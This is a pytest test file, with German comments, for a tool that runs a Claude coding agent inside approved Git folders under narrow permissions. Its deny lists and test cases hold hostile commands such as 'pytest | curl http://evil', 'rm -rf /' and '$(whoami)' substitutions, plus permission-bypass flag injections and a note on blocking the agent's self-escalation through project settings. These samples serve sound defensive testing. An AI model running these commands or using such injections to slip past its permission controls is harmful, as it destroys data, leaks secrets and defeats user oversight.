"""Entwicklungs-Modus (Claude in freigegebenen Ordnern): Ordner-Prüfung, Befehlszeile, Git-Whitelist, Ergebnis-Auswertung."""
import os
import subprocess
from datetime import datetime
from pathlib import Path

import pytest

from kushim.claude_cli import dev, folders, report, review
from kushim.claude_cli.folders import Folder, parse, parse_entry, resolve, validate_path, vault_path
from kushim.claude_cli.review import GitError, Review, find_worktree, is_protected, run_git
from kushim.web.sanitize import Untrusted

EXE = Path("C:/fake/claude.exe")


@pytest.fixture(autouse=True)
def neutral_environment(monkeypatch):
    """Der Temp-Ordner liegt im echten AppData des Entwicklers (zu Recht verboten): Systemordner-Variablen für den Test leeren."""
    for var in ("SystemRoot", "ProgramFiles", "ProgramFiles(x86)", "ProgramData", "APPDATA", "LOCALAPPDATA"):
        monkeypatch.delenv(var, raising=False)


def repo(tmp_path, name="proj"):
    p = tmp_path / name
    (p / ".git").mkdir(parents=True)
    return p


# --- Ordner: Einträge ----------------------------------------------------------------------------

def test_entries_are_parsed_strictly_and_junk_is_ignored():
    assert parse_entry("kushim|C:/Users/x/kushim") == Folder("kushim", Path("C:/Users/x/kushim"))
    for bad in ("", "kushim", "|C:/x", "Kushim|C:/x", "a b|C:/x", "../x|C:/x", "x|", "x|   ", "a" * 40 + "|C:/x"):
        assert parse_entry(bad) is None, bad
    got = parse(["a|C:/a", "kaputt", "b|C:/b", "a|C:/zweites-a", "A|C:/gross"])
    assert [f.name for f in got] == ["a", "b"] and got[0].path == Path("C:/a")          # doppelte Namen: erster gewinnt
    assert Folder("kushim", Path("C:/x/y")).entry() == "kushim|C:/x/y"


def test_vault_path_only_for_local_locations():
    assert vault_path("local:~/kushim-vault") == Path("~/kushim-vault").expanduser()
    assert vault_path("remote:nas") is None


# --- Ordner: Prüfung -----------------------------------------------------------------------------

def test_a_normal_git_project_is_accepted(tmp_path):
    p = repo(tmp_path)
    assert validate_path(p, vault=tmp_path / "vault", home=tmp_path / "home") == p.resolve()


@pytest.mark.parametrize("make,why", [
    (lambda t: Path("relativ/pfad"), "absolut"),
    (lambda t: t / "gibt-es-nicht", "existiert nicht"),
    (lambda t: (t / "datei.txt").write_text("x") and (t / "datei.txt") or (t / "datei.txt"), "kein Ordner"),
    (lambda t: (t / "ohne-git").mkdir() or (t / "ohne-git"), "Git-Repository"),
])
def test_bad_paths_are_refused_with_a_reason(tmp_path, make, why):
    with pytest.raises(ValueError, match=why):
        validate_path(make(tmp_path), home=tmp_path / "home")


def test_drive_root_home_and_protected_areas_are_refused(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".git").mkdir(parents=True)                                   # sogar mit .git: der Benutzerordner selbst bleibt verboten
    with pytest.raises(ValueError, match="Benutzerordner"):
        validate_path(home, home=home)
    with pytest.raises(ValueError, match="Laufwerk"):
        validate_path(Path(tmp_path.anchor), home=home)
    for protected in (".ssh", ".gnupg", ".claude", "AppData"):
        inner = home / protected / "projekt"
        (inner / ".git").mkdir(parents=True)
        with pytest.raises(ValueError, match="geschützten Bereich"):
            validate_path(inner, home=home)
    sysroot = tmp_path / "Windows"
    (sysroot / "projekt" / ".git").mkdir(parents=True)
    monkeypatch.setenv("SystemRoot", str(sysroot))
    with pytest.raises(ValueError, match="geschützten Bereich"):
        validate_path(sysroot / "projekt", home=home)


def test_the_vault_can_never_be_inside_next_to_or_around_an_approved_folder(tmp_path):
    vault = tmp_path / "vault"
    (vault / "projekt" / ".git").mkdir(parents=True)
    with pytest.raises(ValueError, match="Vault"):
        validate_path(vault / "projekt", vault=vault, home=tmp_path / "h")       # Ordner liegt im Vault
    with pytest.raises(ValueError, match="Vault"):
        validate_path(vault, vault=vault, home=tmp_path / "h")                    # Ordner IST der Vault
    outer = tmp_path / "alles"
    (outer / ".git").mkdir(parents=True)
    (outer / "vault").mkdir()
    with pytest.raises(ValueError, match="Vault"):
        validate_path(outer, vault=outer / "vault", home=tmp_path / "h")          # Ordner enthält den Vault


def test_a_junction_that_points_elsewhere_is_refused(tmp_path):
    target = repo(tmp_path, "echtes-projekt")
    link = tmp_path / "abkuerzung"
    if os.name == "nt":
        r = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)], capture_output=True)
        if r.returncode != 0:
            pytest.skip("Junction nicht anlegbar")
    else:
        try:
            os.symlink(target, link)
        except OSError:
            pytest.skip("Symlink nicht anlegbar")
    with pytest.raises(ValueError, match="Verknüpfung"):
        validate_path(link, home=tmp_path / "h")


# --- Ordner: Namen auflösen ----------------------------------------------------------------------

def test_resolving_spoken_names_never_guesses():
    one = [Folder("kushim", Path("C:/k"))]
    two = one + [Folder("webseite", Path("C:/w"))]
    assert resolve(one, None) == one[0] and resolve(one, "das Projekt") == one[0]            # genau ein Ordner: kein Name nötig
    assert resolve(two, "das Projekt kushim") == two[0] and resolve(two, "im Ordner webseite").name == "webseite"
    assert resolve(two, "kuschim").name == "kushim"                                           # Whisper-Variante, ähnlich genug
    assert resolve(two, None) is None and resolve(two, "das Projekt") is None                 # mehrere: nie raten
    assert resolve(two, "garnicht") is None and resolve([], "kushim") is None
    assert resolve(one, "irgendwas anderes") is None                                          # fremder Name bei genau einem Ordner


# --- Befehlszeile --------------------------------------------------------------------------------

def test_start_argv_is_an_isolated_worktree_with_a_narrow_permission_profile():
    argv = dev.build_start_argv(EXE, "Baue den Timer", "kushim-20261004-120000")
    assert argv[:5] == [str(EXE), "-p", "Baue den Timer", "-w", "kushim-20261004-120000"]
    assert argv[argv.index("--permission-mode") + 1] == "acceptEdits" and argv[argv.index("--permission-prompts") + 1] == "none"
    allowed = argv[argv.index("--allowedTools") + 1].split(",")
    denied = argv[argv.index("--disallowedTools") + 1].split(",")
    # Schreibweise der CLI, am echten Aufruf geprüft: "Bash(git add*)" greift NICHT; nötig sind "Bash(git add)" und "Bash(git add *)"
    assert {"Read", "Edit", "Write", "Bash(git add)", "Bash(git add *)", "Bash(git commit)", "Bash(git commit *)",
            "Bash(pytest)", "Bash(pytest *)", "Bash(git status)", "Bash(git status *)"} <= set(allowed)
    assert not any("*)" in a and "Bash(" in a and not a.endswith(" *)") for a in allowed)          # nie die wirkungslose Form "cmd*)"
    assert not any(a.startswith("Bash(git push") or a.startswith("Bash(git merge") or a in ("WebFetch", "WebSearch") for a in allowed)
    assert {"Bash(git push)", "Bash(git push *)", "Bash(git merge *)", "Bash(git checkout *)", "Bash(git branch *)", "Bash(rm)", "Bash(rm *)",
            "Bash(curl *)", "Bash(git config *)", "Bash(git clean *)", "WebFetch", "WebSearch"} <= set(denied)
    assert not any("*)" in d and d.startswith("Bash(") and not d.endswith(" *)") for d in denied)
    for flag in dev.FORBIDDEN_FLAGS:
        assert flag not in argv, flag
    # Selbst-Eskalation verhindern: nur Benutzer-Einstellungen, nie Projekt/lokal (Claude kann .claude/settings*.json im Worktree bearbeiten)
    assert argv[argv.index("--setting-sources") + 1] == "user"
    assert "--strict-mcp-config" in argv and "--max-budget-usd" in argv and argv[argv.index("--max-budget-usd") + 1] == "2"
    assert "--no-session-persistence" not in argv                                   # Sitzung muss für --resume erhalten bleiben
    system = argv[argv.index("--append-system-prompt") + 1]
    assert "Nie pushen" in system and "## Zusammenfassung" in system and "## Rückfrage" in system and "## Nächste Schritte" in system


def test_start_argv_validates_names_tasks_and_extras():
    assert dev.build_start_argv(EXE, "--dangerously-skip-permissions tu was", "kushim-1")[2].startswith("dangerously")
    for bad_name in ("", "Gross", "a b", "../x", "x" * 80, "-w", "a;b"):
        with pytest.raises(ValueError):
            dev.build_start_argv(EXE, "x", bad_name)
    for empty in ("", "  ", "---"):
        with pytest.raises(ValueError):
            dev.build_start_argv(EXE, empty, "kushim-1")
    extra = dev.build_start_argv(EXE, "x", "kushim-1", extra_allowed=("Bash(git diff *)", "Bash(pytest -k*)"))
    assert "Bash(pytest -k*)" in extra[extra.index("--allowedTools") + 1].split(",")


def test_resume_argv_continues_the_session_without_a_new_worktree_and_rejects_injection():
    argv = dev.build_resume_argv(EXE, "Nimm Variante zwei", "0123abcd-ef01-2345-6789-abcdef012345")
    assert argv[:5] == [str(EXE), "-p", "Nimm Variante zwei", "--resume", "0123abcd-ef01-2345-6789-abcdef012345"] and "-w" not in argv
    for bad in ("", "kurz", "x --dangerously-skip-permissions", "id mit leerzeichen", "../../x", "a" * 80):
        with pytest.raises(ValueError):
            dev.build_resume_argv(EXE, "x", bad)
    assert "bypassPermissions" not in argv
    assert argv[argv.index("--setting-sources") + 1] == "user"                       # auch Folgezüge laden keine Projekt-Einstellungen


def test_worktree_names_and_preview_text():
    assert dev.worktree_name(datetime(2026, 10, 4, 15, 30, 5)) == "kushim-20261004-153005"
    text = dev.preview_text("kushim", "Baue den Timer", "kushim-1", "claude.ai", 2.0, 45, extra_allowed=("Bash(pytest -k*)",))
    for part in ("«kushim»", "Auftrag: «Baue den Timer»", "gehen an Anthropic", "Nicht erlaubt: push, merge", "Bash(pytest -k*)",
                 "2 USD und 45 Minuten", "Abo (claude.ai)", "pusht nichts"):
        assert part in text, part
    assert "API-Konto (kann Geld kosten)" in dev.preview_text("k", "t", "w", "api_key", 2.0, 45)
    assert dev.preview_text("k", "t", "w", "claude.ai", 2, 45, resume=True).startswith("Claude antwortet")


# --- Git: nur Lesen ------------------------------------------------------------------------------

@pytest.mark.parametrize("args", [["push"], ["commit", "-m", "x"], ["checkout", "master"], ["merge", "x"], ["reset", "--hard"],
                                  ["branch", "-D", "x"], ["worktree", "add", "x"], ["worktree", "remove", "x"], ["clean", "-fdx"],
                                  ["config", "x", "y"], ["remote", "add", "x", "y"], ["fetch"], [], ["worktree"]])
def test_git_runner_refuses_everything_but_read_commands(args, monkeypatch):
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: pytest.fail("git wurde trotz Whitelist gestartet"))
    with pytest.raises(GitError):
        run_git(args, Path("."))


def test_git_runner_runs_read_commands(tmp_path):
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    assert run_git(["status", "--porcelain"], tmp_path) == ""
    with pytest.raises(GitError):                                                  # auch Lesebefehle melden Fehler neutral
        run_git(["rev-parse", "HEAD"], tmp_path)                                    # noch kein Commit


@pytest.mark.parametrize("path,expected", [
    ("src/kushim/safety/gate.py", True), ("src/kushim/net/web.py", True), ("src/kushim/privacy.py", True), ("tests/test_no_egress.py", True),
    (".claude/skills/x/SKILL.md", True), ("CLAUDE.md", True), ("claude.md", True), (".gitignore", True), ("install.ps1", True),
    ("config.toml", True), ("src\\kushim\\safety\\rules.py", True), ("./src/kushim/safety/gate.py", True),
    ("src/kushim/web/guard.py", False), ("README.md", False), ("tests/test_web.py", False), ("docs/plan.md", False)])
def test_protected_paths(path, expected):
    assert is_protected(path) is expected


PORCELAIN = ("worktree C:/work/proj\nHEAD aaaa\nbranch refs/heads/master\n\n"
             "worktree C:/work/proj/.claude/worktrees/kushim-20261004-120000\nHEAD bbbb\nbranch refs/heads/worktree-kushim-20261004-120000\n")


def fake_git(table):
    calls = []

    def git(args, cwd):
        calls.append((tuple(args), str(cwd)))
        for key, value in table.items():
            if tuple(args[:len(key)]) == key:
                if isinstance(value, Exception):
                    raise value
                return value
        raise GitError("unbekannt")
    git.calls = calls
    return git


def test_find_worktree_by_path_or_branch():
    git = fake_git({("worktree", "list"): PORCELAIN})
    wt = find_worktree(Path("C:/work/proj"), "kushim-20261004-120000", git)
    assert wt.path == Path("C:/work/proj/.claude/worktrees/kushim-20261004-120000") and wt.branch == "worktree-kushim-20261004-120000"
    assert find_worktree(Path("C:/work/proj"), "gibt-es-nicht", git) is None
    assert find_worktree(Path("C:/work/proj"), "x", fake_git({("worktree", "list"): GitError("x")})) is None


def review_table(over=None):
    table = {("rev-parse", "HEAD"): "aaaa\n", ("rev-parse", "--abbrev-ref"): "master\n",
             ("diff", "--name-status"): "M\tREADME.md\nA\tsrc/neu.py\nR100\told.py\tsrc/kushim/safety/gate.py\n",
             ("diff", "--shortstat"): " 3 files changed, 10 insertions(+), 2 deletions(-)\n",
             ("status", "--porcelain"): " M tests/test_no_egress.py\n?? notiz.txt\n"}
    table.update(over or {})
    return table


def test_review_collects_facts_from_git_and_flags_protected_files():
    calls = {"n": 0}

    def git(args, cwd):
        if tuple(args[:2]) == ("rev-parse", "--abbrev-ref"):
            calls["n"] += 1
            return "master\n" if str(cwd) == "base" else "worktree-x\n"
        return fake_git(review_table())(args, cwd)
    rv = review.review(Path("base"), Path("wt"), "aaaa", "master", git)
    assert rv.branch == "worktree-x" and rv.base_unchanged and not rv.error
    assert rv.files == [("M", "README.md"), ("A", "src/neu.py"), ("R100", "src/kushim/safety/gate.py")] and rv.new_files == 1
    assert rv.protected == ["src/kushim/safety/gate.py", "tests/test_no_egress.py"]            # committet UND uncommittet
    assert rv.uncommitted == 2 and "3 files changed" in rv.shortstat


def test_review_detects_changes_to_the_users_own_state_and_missing_worktree_or_git_errors():
    moved = review.review(Path("base"), Path("wt"), "aaaa", "master", fake_git(review_table({("rev-parse", "HEAD"): "ffff\n"})))
    assert not moved.base_unchanged                                                              # Stand des Nutzers hat sich bewegt
    other_branch = review.review(Path("b"), Path("w"), "aaaa", "master", fake_git(review_table({("rev-parse", "--abbrev-ref"): "feature\n"})))
    assert not other_branch.base_unchanged
    assert review.review(Path("b"), None, "aaaa", "master", fake_git(review_table())).error == "Worktree nicht gefunden"
    broken = review.review(Path("b"), Path("w"), "aaaa", "master", fake_git({("rev-parse", "HEAD"): GitError("x")}))
    assert broken.error == "git-Abfrage fehlgeschlagen"


# --- Ergebnis lesen ------------------------------------------------------------------------------

FULL = ("Ich habe den Timer gebaut und Tests geschrieben.\n\n## Zusammenfassung\nTimer in tools/timer.py, 5 Tests, laut pytest grün.\n\n"
        "## Rückfrage\nSoll der Timer auch Sprache können?\n\n## Nächste Schritte\n- Sprachbefehl anbinden\n* UI-Schalter\n3. Doku\n4. Mehr\n")


def test_the_fixed_format_is_parsed_into_summary_question_and_steps():
    p = report.parse(FULL)
    assert p.structured and p.summary == "Timer in tools/timer.py, 5 Tests, laut pytest grün." and p.question == "Soll der Timer auch Sprache können?"
    assert list(p.next_steps) == ["Sprachbefehl anbinden", "UI-Schalter", "Doku"]               # Aufzählungszeichen weg, höchstens 3
    assert all(isinstance(x, Untrusted) for x in (p.summary, p.question, *p.next_steps))


@pytest.mark.parametrize("empty", ["", "-", "Keine", "keine Rückfrage", "nein", "None", "n/a", "entfällt.", "  \n "])
def test_an_empty_question_is_no_question(empty):
    text = f"## Zusammenfassung\nFertig.\n\n## Rückfrage\n{empty}\n\n## Nächste Schritte\n- weiter"
    assert report.parse(text).question == ""


def test_heading_variants_and_missing_format_are_handled():
    alt = "### Zusammenfassung:\nErledigt.\n## Rueckfrage\nWelche Variante?\n## Naechste Schritte\n- A"
    p = report.parse(alt)
    assert p.structured and p.question == "Welche Variante?" and list(p.next_steps) == ["A"]
    free = report.parse("Ich habe etwas gemacht. " * 100)
    assert not free.structured and len(free.summary) <= 710 and free.question == "" and free.next_steps == ()
    assert report.parse("").structured is False


def test_markup_and_terminal_sequences_in_claudes_text_are_cleaned():
    p = report.parse("## Zusammenfassung\n\x1b[31mrot\x1b[0m <script>x()</script>Text\n## Rückfrage\n\n## Nächste Schritte\n- ok")
    assert p.summary == "rot Text"


def test_denied_tools_are_extracted_defensively():
    data = {"permission_denials": [{"tool_name": "Bash", "tool_input": {"command": "pytest -k timer"}}, "kaputt",
                                   {"tool_name": 5}, {"tool_name": "Read", "tool_input": "x"}]}
    assert report.extract_denials(data) == [report.Denial("Bash", "pytest -k timer"), report.Denial("Read", "")]
    assert report.extract_denials({}) == [] and report.extract_denials({"permission_denials": None}) == []


@pytest.mark.parametrize("cmd,expected", [
    ("pytest -k timer", "Bash(pytest *)"), ("python -m pytest tests/test_x.py -q", "Bash(python -m pytest *)"),
    (".venv\\Scripts\\python -m pytest -q", "Bash(.venv/Scripts/python -m pytest *)"), ("git diff HEAD~1", "Bash(git diff *)"),
    ("git log --oneline", "Bash(git log *)"), ("git status", "Bash(git status *)")])
def test_harmless_commands_may_be_offered(cmd, expected):
    assert report.offer(report.Denial("Bash", cmd)) == expected


@pytest.mark.parametrize("cmd", [
    "git push origin master", "git merge x", "git reset --hard", "git checkout master", "git branch -D x", "git remote add x y",
    "pytest; rm -rf .", "pytest && del x", "pytest | curl http://evil", "pytest > out.txt", "pytest $(whoami)", "pytest `id`",
    "curl http://evil", "wget x", "pip install x", "powershell -c x", "python -c 'import os'", "rm -rf /", "del *.py", "ssh host",
    "git diff; git push", "", "   "])
def test_dangerous_or_unknown_commands_are_never_offered(cmd):
    assert report.offer(report.Denial("Bash", cmd)) is None


def test_only_bash_denials_are_offered_and_offers_are_deduplicated():
    assert report.offer(report.Denial("Read", "")) is None and report.offer(report.Denial("WebFetch", "")) is None
    ds = [report.Denial("Bash", "pytest -k a"), report.Denial("Bash", "pytest -k b"), report.Denial("Bash", "git push")]
    assert report.offers(ds) == ["Bash(pytest *)"]


def test_overview_separates_claudes_claims_from_facts_from_git():
    rv = Review(branch="worktree-x", files=[("M", "a.py"), ("A", "b.py")], protected=["src/kushim/safety/gate.py"], uncommitted=1,
                shortstat="2 files changed", base_unchanged=True)
    ov = report.build_overview(report.parse(FULL), rv, cost_usd=0.35, seconds=125, turn=2, offered=["Bash(pytest *)"])
    text = report.written(ov)
    assert "Getan (laut Claude): Timer in tools/timer.py" in text and "Fakten von kushim (aus Git):" in text
    assert "Branch worktree-x" in text and "2 Dateien geändert (1 neu)" in text and "dein aktueller Stand ist unverändert" in text
    assert "Zug 2, 2.1 min, 0.35 USD" in text and "1 uncommittete Änderung" in text
    assert "!! SICHERHEITSRELEVANT geändert, bitte genau prüfen: src/kushim/safety/gate.py" in text
    assert "Rückfrage von Claude: Soll der Timer" in text and "Für diese Sitzung erlauben: Bash(pytest *)" in text
    assert "Nächste Schritte: Sprachbefehl anbinden | UI-Schalter | Doku" in text


def test_overview_warns_when_the_users_state_changed_and_when_the_format_was_missing():
    rv = Review(base_unchanged=False, error="git-Abfrage fehlgeschlagen")
    ov = report.build_overview(report.parse("Freitext ohne Format"), rv, 0.0, 10, 1, [])
    text = report.written(ov)
    assert "ACHTUNG: dein aktueller Stand hat sich verändert" in text and "Prüfung unvollständig" in text and "[Format fehlte, gekürzt]" in text
    assert "keine genannt" in text


def test_spoken_overview_is_short_and_puts_the_question_before_next_steps():
    rv = Review(branch="b", files=[("M", "a.py")], protected=["tests/test_no_egress.py"])
    ov = report.build_overview(report.parse(FULL), rv, 0.1, 30, 1, [])
    s = report.spoken(ov)
    assert len(s.splitlines()) <= 5 and len(s) <= 900
    assert "Achtung: sicherheitsrelevante Dateien" in s and "Claude fragt: Soll der Timer" in s and "Als Nächstes" not in s
    quiet = report.spoken(report.build_overview(report.parse("## Zusammenfassung\nFertig.\n## Rückfrage\n\n## Nächste Schritte\n- A"), Review(branch="b"), 0, 1, 1, []))
    assert "Als Nächstes: A" in quiet and "Claude fragt" not in quiet


def test_extended_rights_add_only_fixed_checks_and_keep_dangerous_commands_denied():
    allowed = " ".join(dev.ALLOWED_TOOLS)
    for ok in ("python -m compileall", "python -m mypy", "npm test", "git blame", "git ls-files"):
        assert f"Bash({ok})" in dev.ALLOWED_TOOLS and f"Bash({ok} *)" in dev.ALLOWED_TOOLS
    for never in ("Bash(python *)", "Bash(python)", "Bash(npx", "Bash(pip", "Bash(npm install", "Bash(rm", "Bash(curl", "Bash(git push", "Bash(powershell", "Bash(*)"):
        assert never not in allowed
    for denied in ("git push", "rm", "del", "curl", "wget", "ssh", "pip", "powershell", "cmd"):
        assert f"Bash({denied})" in dev.DENIED_TOOLS and f"Bash({denied} *)" in dev.DENIED_TOOLS
    assert not set(dev.ALLOWED_TOOLS) & set(dev.DENIED_TOOLS)
